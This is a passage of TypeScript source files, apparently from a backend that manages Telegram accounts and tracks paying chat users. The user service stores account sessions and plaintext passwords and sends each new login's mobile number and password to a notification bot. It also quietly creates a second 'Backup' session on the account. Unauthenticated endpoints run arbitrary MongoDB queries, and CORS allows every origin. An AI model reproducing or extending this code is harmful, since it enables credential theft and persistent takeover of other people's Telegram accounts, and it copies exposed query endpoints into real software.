@ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\n  secondShow?: boolean;\n\n  @ApiPropertyOptional({ description: 'Profile name' })\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n  profile?: string;\n\n  @ApiPropertyOptional({ description: 'Chat ID' })\n  chatId?: string;\n\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\n  picsSent?: boolean;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateUserDataDto } from './create-user-data.dto';\n\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type UserDataDocument = UserData & Document;\n\n@Schema({\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class UserData {\n    @Prop({ required: true })\n    chatId: string;\n\n    @Prop({ required: true })\n    totalCount: number;\n\n    @Prop({ required: true })\n    picCount: number;\n\n    @Prop({ required: true })\n    lastMsgTimeStamp: number;\n\n    @Prop({ required: true })\n    limitTime: number;\n\n    @Prop({ required: true })\n    paidCount: number;\n\n    @Prop({ required: true })\n    prfCount: number;\n\n    @Prop({ required: true })\n    canReply: number;\n\n    @Prop({ required: true })\n    payAmount: number;\n\n    @Prop({ required: true })\n    username: string;\n\n    @Prop({ required: true })\n    accessHash: string;\n\n    @Prop({ required: true })\n    paidReply: boolean;\n\n    @Prop({ required: true })\n    demoGiven: boolean;\n\n    @Prop({ required: true })\n    secondShow: boolean;\n\n    @Prop({ required: true, default: 0 })\n    fullShow: number;\n\n    @Prop({ required: true })\n    profile: string;\n\n    @Prop({ required: true })\n    picSent: boolean;\n\n    @Prop({ required: true })\n    highestPayAmount: number;\n\n    @Prop({ required: true })\n    cheatCount: number;\n\n    @Prop({ required: true })\n    callTime: number;\n\n    @Prop({ required: false, default:[] })\n    videos: number[];\n}\n\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery } from '@nestjs/swagger';\nimport { UserDataService } from './user-data.service';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UserData } from './schemas/user-data.schema';\nimport { SearchDto } from './dto/search-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\n\n@ApiTags('UserData of TG clients')\n@Controller('userData')\nexport class UserDataController {\n  constructor(private readonly userDataService: UserDataService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\n    return this.userDataService.create(createUserDataDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiQuery({ name: 'profile', required: false, description: 'User profile' })\n  @ApiQuery({ name: 'chatId', required: false, description: 'Chat ID' })\n  @ApiQuery({ name: 'isTesting', required: false, type: Boolean })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\n    return this.userDataService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<UserData[]> {\n    return this.userDataService.findAll();\n  }\n\n\n  @Patch('updateAll/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\n  }\n\n\n  @Get(':profile/:chatId')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.findOne(profile, chatId);\n  }\n\n  @Patch(':profile/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\n  }\n\n  @Delete(':profile/:chatId')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.remove(profile, chatId);\n  }\n\n  @Get('clear-count')\n  clearCount(@Query('chatId') chatId?: string) {\n    return this.userDataService.clearCount(chatId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    try {\n      const { query, sort, limit, skip } = requestBody;\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;\n    }\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\nimport { UserDataService } from './user-data.service';\nimport { UserDataController } from './user-data.controller';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\n  controllers: [UserDataController],\n  providers: [UserDataService],\n  exports: [UserDataService]\n})\nexport class UserDataModule { }\n","import { BadRequestException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\nimport { parseError } from '../../utils/parseError';\n\n@Injectable()\nexport class UserDataService {\n    private callCounts: Map<string, number> = new Map();\n    constructor(@InjectModel(UserData.name) private userDataModel: Model<UserDataDocument>) {}\n\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserData> {\n        const createdUser = new this.userDataModel(createUserDataDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<UserData[]> {\n        return await this.userDataModel.find().exec();\n    }\n\n    async findOne(profile: string, chatId: string): Promise<UserData & { count?: number }> {\n        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();\n        if (!user) {\n            console.warn(`UserData with ID \"${profile} - ${chatId}\" not found`);\n        }\n        const currentCount = this.callCounts.get(chatId) || 0;\n        this.callCounts.set(chatId, currentCount + 1);\n        if (user) {\n            return { ...user, count: this.callCounts.get(chatId) };\n        } else {\n            return undefined\n        }\n    }\n\n    clearCount(chatId?: string): string {\n        if (chatId) {\n            this.callCounts.delete(chatId);\n            return `Count cleared for chatId: ${chatId}`;\n        } else {\n            this.callCounts.clear();\n            return 'All counts cleared.';\n        }\n    }\n\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n        delete updateUserDataDto['_id']\n        console.log(updateUserDataDto)\n        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<any> {\n        delete updateUserDataDto['_id']\n        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async remove(profile: string, chatId: string): Promise<UserData> {\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();\n        if (!deletedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<UserData[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.userDataModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<UserData[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.userDataModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async resetPaidUsers() {\n        try {\n            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {\n                $set: {\n                    totalCount: 10,\n                    limitTime: Date.now(),\n                    paidReply: true\n                }\n            });\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    async incrementTotalCount(profile: string, chatId: string, amount: number = 1): Promise<UserData> {\n        const updatedUser = await this.userDataModel.findOneAndUpdate(\n            { profile, chatId },\n            { $inc: { totalCount: amount } },\n            { new: true }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UserData with profile \"${profile}\" and chatId \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async incrementPayAmount(profile: string, chatId: string, amount: number): Promise<UserData> {\n        const updatedUser = await this.userDataModel.findOneAndUpdate(\n            { profile, chatId },\n            { $inc: { payAmount: amount } },\n            { new: true }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UserData with profile \"${profile}\" and chatId \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async updateLastActive(profile: string, chatId: string): Promise<UserData> {\n        return await this.userDataModel.findOneAndUpdate(\n            { profile, chatId },\n            { $set: { lastActiveTime: new Date() } },\n            { new: true }\n        ).exec();\n    }\n\n    async findInactiveSince(date: Date): Promise<UserData[]> {\n        return await this.userDataModel.find({\n            lastActiveTime: { $lt: date }\n        }).exec();\n    }\n\n    async findByPaymentRange(minAmount: number, maxAmount: number): Promise<UserData[]> {\n        return await this.userDataModel.find({\n            payAmount: {\n                $gte: minAmount,\n                $lte: maxAmount\n            }\n        }).exec();\n    }\n\n    async bulkUpdateUsers(filter: any, update: any): Promise<any> {\n        try {\n            const result = await this.userDataModel.updateMany(\n                filter,\n                update,\n                { new: true }\n            ).exec();\n            return result;\n        } catch (error) {\n            throw new InternalServerErrorException(parseError(error));\n        }\n    }\n\n    async findActiveUsers(threshold: number = 30): Promise<UserData[]> {\n        return await this.userDataModel.find({\n            totalCount: { $gt: threshold }\n        }).sort({ totalCount: -1 }).exec();\n    }\n\n    async resetUserCounts(profile: string, chatId: string): Promise<UserData> {\n        return await this.userDataModel.findOneAndUpdate(\n            { profile, chatId },\n            {\n                $set: {\n                    totalCount: 0,\n                    limitTime: new Date(),\n                    paidReply: false\n                }\n            },\n            { new: true }\n        ).exec();\n    }\n}\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class CreateUserDto {\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\n  mobile: string;\n\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\n  session: string;\n\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\n  firstName: string;\n\n  @ApiProperty({ description: 'Last name of the user', example: null })\n  lastName?: string | null;\n\n  @ApiProperty({ description: 'Username of the user', example: null })\n  username?: string | null;\n\n  @ApiProperty({ description: 'Number of channels', example: 56 })\n  channels: number;\n\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\n  personalChats: number;\n\n  @ApiProperty({ description: 'Number of messages', example: 0 })\n  msgs: number;\n\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\n  totalChats: number;\n\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\n  lastActive: string;\n\n  @ApiProperty({ description: 'Telegram ID of the user', example: '2022068676' })\n  tgId: string;\n\n  @ApiProperty({ description: 'TwoFA status', example: false })\n  twoFA: boolean = false;\n\n  @ApiProperty({ description: 'Expiration status', example: false })\n  expired: boolean = false;\n\n  @ApiProperty({ description: 'password', example: \"pass\" })\n  password: string = null;\n\n  @ApiProperty({ description: 'Number of movies', example: 0 })\n  movieCount: number = 0;\n\n  @ApiProperty({ description: 'Number of photos', example: 0 })\n  photoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of videos', example: 0 })\n  videoCount: number = 0;\n\n  @ApiProperty({ description: 'Gender of the user', example: null })\n  gender?: string | null;\n\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\n  otherPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\n  otherVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\n  ownPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\n  ownVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\n  contacts: number = 0;\n\n  @ApiProperty({\n    description: 'Call details of the user',\n    example: {\n      outgoing: 1,\n      incoming: 0,\n      video: 1,\n      chatCallCounts: [],\n      totalCalls: 1,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional({\n    description: 'Call details of the user',\n    example: []\n  })\n  recentUsers: any[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\n\nexport class SearchUserDto {\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\n  @IsOptional()\n  @IsString()\n  tgId?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\n  @IsOptional()\n  @IsString()\n  mobile?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  twoFA?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  expired?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by session' })\n  @IsOptional()\n  @IsString()\n  session?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by first name' })\n  @IsOptional()\n  @IsString()\n  firstName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by last name' })\n  @IsOptional()\n  @IsString()\n  lastName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by username' })\n  @IsOptional()\n  @IsString()\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\n  @IsOptional()\n  @IsNumber()\n  channels?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\n  @IsOptional()\n  @IsNumber()\n  personalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\n  @IsOptional()\n  @IsBoolean()\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\n  @IsOptional()\n  @IsNumber()\n  msgs?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\n  @IsOptional()\n  @IsNumber()\n  totalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\n  @IsOptional()\n  @IsNumber()\n  lastActive?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\n  @IsOptional()\n  @IsNumber()\n  movieCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\n  @IsOptional()\n  @IsNumber()\n  photoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by video count' })\n  @IsOptional()\n  @IsNumber()\n  videoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by gender' })\n  @IsOptional()\n  @IsString()\n  gender?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\n  @IsOptional()\n  @IsNumber()\n  otherPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\n  @IsOptional()\n  @IsNumber()\n  otherVideoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\n  @IsOptional()\n  @IsNumber()\n  ownPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\n  @IsOptional()\n  @IsNumber()\n  ownVideoCount?: number;\n}\n","import { PartialType } from '@nestjs/mapped-types';\nimport { CreateUserDto } from './create-user.dto';\n\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport type UserDocument = User & Document;\n\n@Schema({\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      ret['id'] = ret._id;\n      delete ret._id;\n      return ret;\n    },\n  },\n})\nexport class User {\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  mobile: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  session: string;\n\n  @ApiProperty()\n  @Prop()\n  firstName: string;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  lastName: string | null;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  username: string | null;\n\n  @ApiProperty()\n  @Prop()\n  channels: number;\n\n  @ApiProperty()\n  @Prop()\n  personalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  demoGiven: boolean;\n\n  @ApiProperty()\n  @Prop()\n  msgs: number;\n\n  @ApiProperty()\n  @Prop()\n  totalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  lastActive: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  tgId: string;\n\n  @ApiProperty()\n  @Prop()\n  movieCount: number;\n\n  @ApiProperty()\n  @Prop()\n  photoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  videoCount: number;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  gender: string | null;\n\n  @Prop({ required: false, type: Boolean })\n  twoFA: boolean = false\n\n  @Prop({ required: false, type: Boolean, default: false })\n  expired: boolean = false\n\n  @Prop({ required: false })\n  password: string = null\n\n  @ApiProperty()\n  @Prop()\n  otherPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  otherVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  contacts: number;\n\n  @ApiProperty()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: {\n      outgoing: 0,\n      incoming: 0,\n      video: 0,\n      chatCallCounts: [],\n      totalCalls: 0,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: [],\n    required: false,\n  })\n  recentUsers: any[];\n}\n\nexport const UserSchema = SchemaFactory.createForClass(User);\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query } from '@nestjs/common';\nimport { UsersService } from './users.service';\nimport { User } from './schemas/user.schema';\nimport { ApiTags, ApiOperation, ApiParam } from '@nestjs/swagger';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\n\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\n@Controller('user')\nexport class UsersController {\n  constructor(private readonly usersService: UsersService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new user' })\n  async create(@Body() createUserDto: CreateUserDto) {\n    console.log(\"creating new user\")\n    return this.usersService.create(createUserDto);\n  }\n\n  @Get('/search')\n  @ApiOperation({ summary: 'Search users based on various parameters' })\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\n    return this.usersService.search(queryParams);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all users' })\n  async findAll() {\n    return this.usersService.findAll();\n  }\n\n  @Get(':tgId')\n  @ApiOperation({ summary: 'Get a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async findOne(@Param('tgId') tgId: string) {\n    return this.usersService.findOne(tgId);\n  }\n\n  @Patch(':tgId')\n  @ApiOperation({ summary: 'Update a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\n    return this.usersService.update(tgId, updateUserDto);\n  }\n\n  @Delete(':tgId')\n  @ApiOperation({ summary: 'Delete a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async remove(@Param('tgId') tgId: string) {\n    return this.usersService.delete(tgId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    const { query, sort, limit, skip } = requestBody;\n    try {\n      return await this.usersService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UsersService } from './users.service';\nimport { UsersController } from './users.controller';\nimport { UserSchema } from './schemas/user.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ClientModule } from '../clients/client.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [UsersController],\n  providers: [UsersService],\n  exports: [UsersService]\n})\nexport class UsersModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { User, UserDocument } from './schemas/user.schema';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\n\n@Injectable()\nexport class UsersService {\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\n    @Inject(forwardRef(() => TelegramService))\n    private telegramService: TelegramService,\n    @Inject(forwardRef(() => ClientService))\n    private clientsService: ClientService\n  ) { }\n\n  async create(user: CreateUserDto): Promise<User | undefined> {\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\n    console.log(\"New User received - \", user?.mobile);\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\n      await this.clientsService.updateClientSession(user.session)\n    } else {\n      await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\n      setTimeout(async () => {\n        try {\n          await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });\n          // this.telegramService.forwardMediaToBot(user.mobile, null);\n          const newSession = await this.telegramService.createNewSession(user.mobile);\n          const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: \"Backup\" });\n          await newUserBackup.save();\n        } catch (error) {\n          console.log(\"Error in creating new session\", error);\n        }\n      }, 3000);\n      const newUser = new this.userModel(user);\n      return newUser.save();\n    }\n  }\n\n  async findAll(): Promise<User[]> {\n    return this.userModel.find().exec();\n  }\n\n  async findOne(tgId: string): Promise<User> {\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\n    if (!user) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n    return user;\n  }\n\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async delete(tgId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ tgId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n  }\n\n  async deleteById(userId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ _id: userId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with id ${userId} not found`);\n    }\n  }\n\n  async search(filter: SearchUserDto): Promise<User[]> {\n    if (filter.firstName) {\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\n    }\n    if (filter.twoFA !== undefined) {\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\n    }\n    console.log(filter)\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number) {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.userModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n}\n","export enum PrivacyLevelEnum {\r\n    everybody = 'everybody',\r\n    contacts = 'contacts',\r\n    nobody = 'nobody'\r\n}\r\n\r\nexport type PrivacyLevel = keyof typeof PrivacyLevelEnum;\r\n\r\nexport interface ActiveClientSetup {\r\n    days?: number;\r\n    archiveOld: boolean;\r\n    formalities: boolean;\r\n    newMobile: string;\r\n    existingMobile: string;\r\n    clientId: string;\r\n}\r\n\r\nexport interface ChatStatistics {\r\n    period: 'day' | 'week' | 'month';\r\n    totalMessages: number;\r\n    uniqueSenders: number;\r\n    messageTypes: {\r\n        text: number;\r\n        photo: number;\r\n        video: number;\r\n        voice: number;\r\n        other: number;\r\n    };\r\n    topSenders: Array<{\r\n        id: string;\r\n        count: number;\r\n    }>;\r\n    mostActiveHours: Array<{\r\n        hour: number;\r\n        count: number;\r\n    }>;\r\n}\r\n\r\nexport interface ContentFilter {\r\n    chatId: string;\r\n    keywords?: string[];\r\n    mediaTypes?: ('photo' | 'video' | 'document')[];\r\n    actions: ('delete' | 'warn' | 'mute')[];\r\n}\r\n\r\nexport interface MessageScheduleOptions {\r\n    chatId: string;\r\n    message: string;\r\n    scheduledTime: Date;\r\n    replyTo?: number;\r\n    silent?: boolean;\r\n}\r\n\r\nexport interface GroupOptions {\r\n    title: string;\r\n    members?: string[];\r\n    photo?: string;\r\n    about?: string;\r\n    address?: string;\r\n    slowMode?: number;\r\n    megagroup?: boolean;\r\n    forImport?: boolean;\r\n    memberRestrictions?: {\r\n        sendMessages?: boolean;\r\n        sendMedia?: boolean;\r\n        sendStickers?: boolean;\r\n        sendGifs?: boolean;\r\n        sendGames?: boolean;\r\n        sendInline?: boolean;\r\n        embedLinks?: boolean;\r\n    };\r\n}\r\n\r\nexport interface ChannelInfo {\r\n    chatsArrayLength: number;\r\n    canSendTrueCount: number;\r\n    canSendFalseCount: number;\r\n    ids: string[];\r\n    canSendFalseChats: string[];\r\n}\r\n\r\nexport interface ChatFolderOptions {\r\n    name: string;\r\n    includedChats: string[];\r\n    excludedChats?: string[];\r\n    includeContacts?: boolean;\r\n    includeNonContacts?: boolean;\r\n    includeGroups?: boolean;\r\n    includeBroadcasts?: boolean;\r\n    includeBots?: boolean;\r\n    excludeMuted?: boolean;\r\n    excludeRead?: boolean;\r\n    excludeArchived?: boolean;\r\n}","/* eslint-disable @typescript-eslint/no-empty-object-type */\nimport { NestFactory } from '@nestjs/core';\nimport mongoose from 'mongoose'\nimport { AppModule } from './app.module';\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\nimport { ValidationPipe } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport * as fs from 'fs';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  const config = new DocumentBuilder()\n    .setTitle('NestJS and Express API')\n    .setDescription('API documentation')\n    .setVersion('1.0')\n    .build();\n\n  interface CustomRequest extends Request {}\n  interface CustomResponse extends Response {}\n  interface CustomNextFunction extends NextFunction {}\n\n  app.use((req: CustomRequest, res: CustomResponse, next: CustomNextFunction) => {\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Methods', 